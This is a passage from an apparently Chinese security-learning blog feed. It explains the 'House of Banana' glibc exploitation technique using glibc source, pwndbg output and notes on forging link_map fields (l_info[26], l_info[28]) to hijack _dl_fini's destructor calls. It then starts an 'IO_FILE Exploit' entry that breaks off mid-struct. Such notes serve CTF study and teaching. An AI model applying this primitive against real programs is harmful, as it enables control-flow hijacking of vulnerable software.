class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">rtld_global</span> -&gt;</span> _<span class="hljs-function"><span class="hljs-title">ns_loaded</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">link_map</span> -&gt;</span> ((fini_t) array[i]) ()<br></code></pre></td></tr></table></figure><p>而 rtld_global</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rtld_global</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span><br><span class="hljs-comment">     must remain the first element.  Forever.  */</span><br><br><span class="hljs-comment">/* Non-shared code has no support for multiple namespaces.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> DL_NNS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> DL_NNS 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  EXTERN <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_namespaces</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-comment">/* A pointer to the map for the main map.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *_<span class="hljs-title">ns_loaded</span>;</span><span class="hljs-comment">//指向link_map结构体指针</span><br>    <span class="hljs-comment">/* Number of object in the _dl_loaded list.  */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _ns_nloaded;<br>    <span class="hljs-comment">/* Direct pointer to the searchlist of the main object.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_scope_elem</span> *_<span class="hljs-title">ns_main_searchlist</span>;</span><br>    <span class="hljs-comment">/* This is zero at program start to signal that the global scope map is</span><br><span class="hljs-comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span><br><span class="hljs-comment">       reset if in _dl_close if the last global object is removed.  */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _ns_global_scope_alloc;<br><br>    <span class="hljs-comment">/* During dlopen, this is the number of objects that still need to</span><br><span class="hljs-comment">       be added to the global scope map.  It has to be taken into</span><br><span class="hljs-comment">       account when resizing the map, for future map additions after</span><br><span class="hljs-comment">       recursive dlopen calls from ELF constructors.  */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _ns_global_scope_pending_adds;<br><br>    <span class="hljs-comment">/* Once libc.so has been loaded into the namespace, this points to</span><br><span class="hljs-comment">       its link map.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">libc_map</span>;</span> <br><br>    <span class="hljs-comment">/* Search table for unique objects.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">unique_sym_table</span></span><br><span class="hljs-class">    &#123;</span><br>      __rtld_lock_define_recursive (, lock)<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">unique_sym</span></span><br><span class="hljs-class">      &#123;</span><br>    <span class="hljs-type">uint32_t</span> hashval;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym;<br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">map</span>;</span>  <br>      &#125; *entries;<br>      <span class="hljs-type">size_t</span> size;<br>      <span class="hljs-type">size_t</span> n_elements;<br>      <span class="hljs-type">void</span> (*<span class="hljs-built_in">free</span>) (<span class="hljs-type">void</span> *);<br>    &#125; _ns_unique_sym_table;<br>    <span class="hljs-comment">/* Keep track of changes to each namespace&#x27; list.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_debug</span> _<span class="hljs-title">ns_debug</span>;</span><br>  &#125; _dl_ns[DL_NNS];<br>  <span class="hljs-comment">/* One higher than index of last used namespace.  */</span><br>  EXTERN <span class="hljs-type">size_t</span> _dl_nns;<br>.................................................................................<br>&#125;;<br></code></pre></td></tr></table></figure><p>该结构体里有多个 _dl_ns 结构体，存储的是 elf 各段的符号结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p _rtld_global<br>$<span class="hljs-number">1</span> = &#123;<br>  _dl_ns = &#123;&#123;<br>      _ns_loaded = <span class="hljs-number">0x7ffff7ffe2e0</span>, <span class="hljs-comment">//link_map 头指针</span><br>      _ns_nloaded = <span class="hljs-number">4</span>,  <span class="hljs-comment">//有几个</span><br>      _ns_main_searchlist = <span class="hljs-number">0x7ffff7ffe5a0</span>,<br><br></code></pre></td></tr></table></figure><p>而 link_map 在 gdb 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p *(<span class="hljs-keyword">struct</span> link_map *) <span class="hljs-number">0x7ffff7ffe2e0</span><br>$<span class="hljs-number">2</span> = &#123;<br>  l_addr = <span class="hljs-number">93824992231424</span>,<br>  l_name = <span class="hljs-number">0x7ffff7ffe888</span> <span class="hljs-string">&quot;&quot;</span>,<br>  l_ld = <span class="hljs-number">0x555555557dc8</span>,<br>  l_next = <span class="hljs-number">0x7ffff7ffe890</span>,<br>  l_prev = <span class="hljs-number">0x0</span>,<br>  l_real = <span class="hljs-number">0x7ffff7ffe2e0</span>,<br>  l_ns = <span class="hljs-number">0</span>,<br>  l_libname = <span class="hljs-number">0x7ffff7ffe870</span>,<br>  l_info = &#123;<span class="hljs-number">0x0</span>, <span class="hljs-number">0x555555557dc8</span>, <span class="hljs-number">0x555555557ea8</span>, <span class="hljs-number">0x555555557e98</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x555555557e48</span>, <span class="hljs-number">0x555555557e58</span>, <span class="hljs-number">0x555555557ed8</span>, <span class="hljs-number">0x555555557ee8</span>, <span class="hljs-number">0x555555557ef8</span>, <span class="hljs-number">0x555555557e68</span>, <span class="hljs-number">0x555555557e78</span>, <span class="hljs-number">0x555555557dd8</span>, <span class="hljs-number">0x555555557de8</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x555555557eb8</span>, <span class="hljs-number">0x555555557e88</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x555555557ec8</span>, <span class="hljs-number">0x555555557f18</span>, <span class="hljs-number">0x555555557df8</span>, <span class="hljs-number">0x555555557e18</span>, <span class="hljs-number">0x555555557e08</span>, <span class="hljs-number">0x555555557e28</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x555555557f08</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x555555557f38</span>, <span class="hljs-number">0x555555557f28</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x555555557f18</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x555555557f58</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x555555557f48</span>, <span class="hljs-number">0x0</span> &lt;repeats <span class="hljs-number">25</span> times&gt;, <span class="hljs-number">0x555555557e38</span>&#125;,<br>  l_phdr = <span class="hljs-number">0x555555554040</span>,<br>  l_entry = <span class="hljs-number">93824992235616</span>,<br>  l_phnum = <span class="hljs-number">13</span>,<br>  l_ldnum = <span class="hljs-number">0</span>,<br>  l_searchlist = &#123;<br>    r_list = <span class="hljs-number">0x7ffff7fbb690</span>,<br>    r_nlist = <span class="hljs-number">3</span><br>  &#125;,<br>  l_symbolic_searchlist = &#123;<br>    r_list = <span class="hljs-number">0x7ffff7ffe868</span>,<br>    r_nlist = <span class="hljs-number">0</span><br>  &#125;,<br>  l_loader = <span class="hljs-number">0x0</span>,<br>  l_versions = <span class="hljs-number">0x7ffff7fbb6b0</span>,<br>  l_nversions = <span class="hljs-number">4</span>,<br>  l_nbuckets = <span class="hljs-number">2</span>,<br>  l_gnu_bitmask_idxbits = <span class="hljs-number">0</span>,<br>  l_gnu_shift = <span class="hljs-number">6</span>,<br>  l_gnu_bitmask = <span class="hljs-number">0x5555555543c0</span>,<br>  &#123;<br>    l_gnu_buckets = <span class="hljs-number">0x5555555543c8</span>,<br>    l_chain = <span class="hljs-number">0x5555555543c8</span><br>  &#125;,<br>  &#123;<br>    l_gnu_chain_zero = <span class="hljs-number">0x5555555543b8</span>,<br>    l_buckets = <span class="hljs-number">0x5555555543b8</span><br>  &#125;,<br>  l_direct_opencount = <span class="hljs-number">1</span>,<br>  l_type = lt_executable,<br>  l_relocated = <span class="hljs-number">1</span>,<br>  l_init_called = <span class="hljs-number">1</span>,<br>  l_global = <span class="hljs-number">1</span>,<br>  l_reserved = <span class="hljs-number">0</span>,<br>  l_main_map = <span class="hljs-number">0</span>,<br>  l_visited = <span class="hljs-number">1</span>,<br>  l_map_used = <span class="hljs-number">0</span>,<br>  l_map_done = <span class="hljs-number">0</span>,<br>  l_phdr_allocated = <span class="hljs-number">0</span>,<br>  l_soname_added = <span class="hljs-number">0</span>,<br>  l_faked = <span class="hljs-number">0</span>,<br>  l_need_tls_init = <span class="hljs-number">0</span>,<br>  l_auditing = <span class="hljs-number">0</span>,<br>  l_audit_any_plt = <span class="hljs-number">0</span>,<br>  l_removed = <span class="hljs-number">0</span>,<br>  l_contiguous = <span class="hljs-number">1</span>,<br>  l_symbolic_in_local_scope = <span class="hljs-number">0</span>,<br>  l_free_initfini = <span class="hljs-number">0</span>,<br>  l_ld_readonly = <span class="hljs-number">0</span>,<br>  l_find_object_processed = <span class="hljs-number">0</span>,<br>  l_nodelete_active = <span class="hljs-literal">false</span>,<br>  l_nodelete_pending = <span class="hljs-literal">false</span>,<br>  l_property = lc_property_valid,<br>  l_x86_feature_1_and = <span class="hljs-number">3</span>,<br>  l_x86_isa_1_needed = <span class="hljs-number">1</span>,<br>  l_1_needed = <span class="hljs-number">0</span>,<br>  l_rpath_dirs = &#123;<br>    dirs = <span class="hljs-number">0xffffffffffffffff</span>,<br>    malloced = <span class="hljs-number">0</span><br>  &#125;,<br>  l_reloc_result = <span class="hljs-number">0x0</span>,<br>  l_versyms = <span class="hljs-number">0x555555554510</span>,<br>  l_origin = <span class="hljs-number">0x0</span>,<br>  l_map_start = <span class="hljs-number">93824992231424</span>,<br>  l_map_end = <span class="hljs-number">93824992247832</span>,<br>  l_text_end = <span class="hljs-number">93824992235897</span>,<br>  l_scope_mem = &#123;<span class="hljs-number">0x7ffff7ffe5a0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>&#125;,<br>  l_scope_max = <span class="hljs-number">4</span>,<br>  l_scope = <span class="hljs-number">0x7ffff7ffe650</span>,<br>  l_local_scope = &#123;<span class="hljs-number">0x7ffff7ffe5a0</span>, <span class="hljs-number">0x0</span>&#125;,<br>  l_file_id = &#123;<br>    dev = <span class="hljs-number">0</span>,<br>    ino = <span class="hljs-number">0</span><br>  &#125;,<br>  l_runpath_dirs = &#123;<br>    dirs = <span class="hljs-number">0xffffffffffffffff</span>,<br>    malloced = <span class="hljs-number">0</span><br>  &#125;,<br>  l_initfini = <span class="hljs-number">0x7ffff7fbb670</span>,<br>  l_reldeps = <span class="hljs-number">0x0</span>,<br>  l_reldepsmax = <span class="hljs-number">0</span>,<br>  l_used = <span class="hljs-number">1</span>,<br>  l_feature_1 = <span class="hljs-number">0</span>,<br>  l_flags_1 = <span class="hljs-number">134217729</span>,<br>  l_flags = <span class="hljs-number">8</span>,<br>  l_idx = <span class="hljs-number">0</span>,<br>  l_mach = &#123;<br>    plt = <span class="hljs-number">0</span>,<br>    gotplt = <span class="hljs-number">0</span>,<br>    tlsdesc_table = <span class="hljs-number">0x0</span><br>  &#125;,<br>  l_lookup_cache = &#123;<br>    sym = <span class="hljs-number">0x555555554420</span>,<br>    type_class = <span class="hljs-number">1</span>,<br>    value = <span class="hljs-number">0x7ffff7fbb160</span>,<br>    ret = <span class="hljs-number">0x7ffff7c15cc0</span><br>  &#125;,<br>  l_tls_initimage = <span class="hljs-number">0x0</span>,<br>  l_tls_initimage_size = <span class="hljs-number">0</span>,<br>  l_tls_blocksize = <span class="hljs-number">0</span>,<br>  l_tls_align = <span class="hljs-number">0</span>,<br>  l_tls_firstbyte_offset = <span class="hljs-number">0</span>,<br>  l_tls_offset = <span class="hljs-number">0</span>,<br>  l_tls_modid = <span class="hljs-number">0</span>,<br>  l_tls_dtor_count = <span class="hljs-number">0</span>,<br>  l_relro_addr = <span class="hljs-number">15800</span>,<br>  l_relro_size = <span class="hljs-number">584</span>,<br>  l_serial = <span class="hljs-number">0</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>当执行到 _dl_fini 函数时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_dl_fini (<span class="hljs-type">void</span>)<br>&#123;<br>...<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">maps</span>[<span class="hljs-title">nloaded</span>];</span>               <br><br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>      assert (nloaded != <span class="hljs-number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="hljs-literal">NULL</span>);<br>      <span class="hljs-keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="hljs-number">0</span>; l != <span class="hljs-literal">NULL</span>; l = l-&gt;l_next)<br>        <span class="hljs-comment">/* Do not handle ld.so in secondary namespaces.  */</span><br>        <span class="hljs-keyword">if</span> (l == l-&gt;l_real)     <span class="hljs-comment">//检查1，需要伪造</span><br>          &#123;<br>        assert (i &lt; nloaded);<br><br>        maps[i] = l;<br>        l-&gt;l_idx = i;<br>        ++i;<br><br>        <span class="hljs-comment">/* Bump l_direct_opencount of all objects so that they</span><br><span class="hljs-comment">           are not dlclose()ed from underneath us.  */</span><br>        ++l-&gt;l_direct_opencount;<br>          &#125;<br>      assert (ns != LM_ID_BASE || i == nloaded);<br>      assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nmaps = i;<br><br>      _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),<br>             <span class="hljs-literal">NULL</span>, <span class="hljs-literal">true</span>);<br><br>      __rtld_lock_unlock_recursive (GL(dl_load_lock));<span class="hljs-number">56</span><br><br>      <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nmaps; ++i)<br>        &#123;<br>          <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span> =</span> maps[i];      <br><br>          <span class="hljs-keyword">if</span> (l-&gt;l_init_called)         <span class="hljs-comment">//检查2       </span><br>        &#123;<br>          l-&gt;l_init_called = <span class="hljs-number">0</span>;                     <br><br>          <span class="hljs-comment">/* Is there a destructor function?  */</span><br>          <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span><br>              || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>))<br>            &#123;<br>              <span class="hljs-comment">/* When debugging print a message first.  */</span><br>              <span class="hljs-keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)<br>                        &amp; DL_DEBUG_IMPCALLS, <span class="hljs-number">0</span>))<span class="hljs-comment">//检查3</span><br>            _dl_debug_printf (<span class="hljs-string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<br>                      DSO_FILENAME (l-&gt;l_name),<br>                      ns);<br><br>              <span class="hljs-comment">/* First see whether an array is given.  */</span><br>              <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//检查4</span><br>            &#123;<br>              ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>                (ElfW(Addr) *) (l-&gt;l_addr<br>                        + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br>              <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>                        / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br>              <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>                ((<span class="hljs-type">fini_t</span>) <span class="hljs-built_in">array</span>[i]) (); <span class="hljs-comment">//这里就是最后要执行的</span><br>            &#125;<br><br>....<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 l 指的就是 link_map 结构体</p><p>控制 array 的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>              (ElfW(Addr) *) (l-&gt;l_addr<br>                      + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br></code></pre></td></tr></table></figure><p>DT_FINI_ARRAY 是宏，为 26</p><p>而 d_un 是一个联合体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    Elf32_Word d_val;<span class="hljs-comment">/* Integer value */</span><br>    Elf32_Addr d_ptr;<span class="hljs-comment">/* Address value */</span><br>  &#125; d_un;<br></code></pre></td></tr></table></figure><p>所以我们如果将 l-&gt;l_info[26] 设为 l-&gt;l_info[26] 的地址 ，l-&gt;l_info[27] 就是 array 的的值</p><p>控制 i 的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>          / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br></code></pre></td></tr></table></figure><p> DT_FINI_ARRAYSZ 宏，是 28</p><p>同理，如果这里将 l-&gt;l_info[28] 设为其地址，那么 i&#x3D;l-&gt;l_[29]&#x2F;8</p><p>这样同时控制了 array 和 i ，就可以在后面的流程里控制程序流了</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://p0ach1l.github.io/2024/11/05/House-of-Banana%E6%94%BB%E5%87%BB/#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90">House-of-Banana攻击 - 能打八个攻城狮</a> </p><p> <a href="https://www.anquanke.com/post/id/222948#h3-5">house of banana-安全KER - 安全资讯平台</a> </p><p> <a href="https://zikh26.github.io/posts/efb4678.html">关于house of banana的学习总结 | ZIKH26’s Blog</a> </p>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IO_FILE Exploit</title>
    <link href="/2025/05/19/IO_FILE%20Exploit/"/>
    <url>/2025/05/19/IO_FILE%20Exploit/</url>
    
    <content type="html"><![CDATA[<h1 id="FILE结构"><a href="#FILE结构" class="headerlink" title="FILE结构"></a>FILE结构</h1><h2 id="FILE介绍"><a href="#FILE介绍" class="headerlink" title="FILE介绍"></a>FILE介绍</h2><p>FILE是linux系统标I&#x2F;O库中用于<strong>表示文件流</strong>的数据结构，称文件流</p><p>通过fopen等函数创建，分配在堆中</p><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span 